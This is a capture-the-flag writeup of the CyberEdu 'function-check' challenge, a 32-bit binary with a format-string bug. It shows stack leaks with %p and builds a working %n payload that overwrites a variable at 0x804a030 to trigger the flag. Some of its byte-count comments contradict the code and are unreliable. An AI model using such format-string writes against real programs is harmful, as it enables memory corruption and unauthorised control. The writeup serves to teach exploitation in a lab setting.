+++
date = '2025-12-21'
draft = false
title = "CyberEdu function-check Writeup"
ShowToc = true
tags = ["CyberEdu", "pwn", "format-string"]
+++

## Challenge overview


We need a master to manipulate the syntax of a **[program](https://app.cyber-edu.co/challenges/08ef6340-c1e4-11eb-9b9f-6bd8e9c6de87?tenant=cyberedu)**.

![challenge-screenshot](pic1.png#center)

At first glance, the **format** looks like a 32-bit executable, and it doesn't really look like it's going to be fun to test locally, so let's just try it remotely right away.

Upon checking, every protection is disabled, so that's nice! Now let's take a look at the binary. 

![challenge-screenshot](pic2.png#center)

Pretty straight forward, we have a `main` function and a `printFlag` function. As the binary name suggests, a fmtstr vulnerability, and a value `demo_3187` we're supposed to overwrite.


---

## Identifying the vulnerabilities

Since this is clearly a format string vulnerability, we're going to be using `pwntools`' great tool `fmtstr_payload()`. All we need to know is the format string offset on the stack, and we can calculate that fairly easily. 

Looking at the stack value where our first input gets shown, we can see the offset here is 4 (by counting); we need to take in consideration the 'Break stuff' part of the string as well. 

```python
Break stuff.  
0xffd88618   <-- 1
0xc8         <-- 2
(nil)        <-- 3
0x61657242   <-- 4  ('Brea')
0x7473206b   <-- 5  ('k st')
0x2e666675   <-- 6  ('uff.')
0x70252020   <-- 7  ('  %p')
0x20702520   <-- 8
0x25207025   <-- 9
...
```



![challenge-screenshot](pic3.png#center)

We already get to see the location of the thing we want to modify, so no need to bother with that, and we just need to change that to `0x20`.

![challenge-screenshot](pic4.png#center)

`EOF`... and another `EOF`... and so on...

I tried doing so with quite a couple of different fmtstr payloads, but apparently there is an issue with that: fmtstr_payload appends addresses to the end of the payload, using `%<offset>$n` to write to those appended addresses. And the `printf` that was being used by them without an argument was messing with a bunch of stuff, like the offset, and it wasn't displaying data in the way it was supposed to. And the address we wanted to modify wasn't properly becoming a part of the stack frame.

```python
printf(user_input);       # BAD
printf(user_input, arg);  # fmtstr_payload-friendly
```

Plus, if `%p` shows string bytes, that's another sign we need to manually make our payload.


---

## The Manual Exploit

We're going to be using `%n` for this. What this does is take the current output byte count and store it at the given address. So we need to make a payload with a length of `32`, so that we can overwrite what's at value `0x804a030` for example with the length of our payload (`32`). `%n` is basically telling `printf` where to store the amount of bytes written this far. It isn't a magical write what I want where I want, so we need to play by its rules.

![challenge-screenshot](pic5.png#center)

After a little bit of testing, it looks like the offset our prefixed address (because we add it before the `%n`, in `p32` format) ends up at is 9. So keeping that in mind, let's finish building our offset. `%nr$c` just writes a character as padding `nr` times so we're going to be using that to reach the required number of bytes.

Since I figured the string length of the `%9$p` was 4, I thought I should keep it as 4 to not modify the offset from 9.

```python

#payload  = b"%9$p"         #lets keep it as 4 bytes
payload = b"byte" #4 bytes
payload += p32(0x804a030) # 4 bytes, 8 in total  
payload += b"%21$c" #add another 21 bytes
		    # so 32 in total now
payload += b"%8$n" #modify the address at offset 9 with total length
		   #doesnt actually print anything so it doesnt modify length
		   
```

But once again, I kept getting `EOF`, so I thought to take another look at it with 

```python
payload = b"AAAA" + p32(0x804a030) + b"." + b"%p." * 20
```

And we got this: 

![challenge-screenshot](pic6.png#center)

The value was right there, *split between* the 8th and 9th offset. So we needed to modify that 4-byte padding, to push it and have it occupy and entire offset value, instead of the current thing.

With the buffer `AAAAA` of length 5, the 8th and 9th offest looked like this: `0x30414141.0x2e0804a0`.

With the buffer `AAAAAA` of length 6, they looked like this: `0x41414141.0x804a030`!

That made me think, this just made us shift the whole address by 6 bytes, so we could probably just use 2 bytes instead of 6 and have it cover the 8th offset instead of the 9th (I was correct):

![challenge-screenshot](pic7.png#center)

So let's build the final payload that way.

![challenge-screenshot](pic8.png#center)

Finally, we did something! For some reason though, we need 5 more bytes in length, can't really tell why, but at this point we can just change the `%x$c` offset and take the win. 

After modifying the `%c` thing, it looks like whatever we give it we end up with that `0x15`, so I just moved to manually writing bytes. In the end, the payload that worked was this: 

```python

#payload  = b"%9$p"         #lets keep it as 4 bytes
payload = b"by" #2 bytes
payload += p32(0x804a030) # 4 bytes, 6 in total  
payload += b"c"*12 #add another 26 bytes theoretically
		   #no clue why 'c'*12 is 26 bytes but whatever
		    # so 32 in total now
		    
payload += b"%8$n" #modify the address at offset 8 with total length
		   #doesnt actually print anything so it doesnt modify length
		   
```

---

And of course, it worked!

![challenge-screenshot](pic9.png#center)

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/functioncheck.py)**.
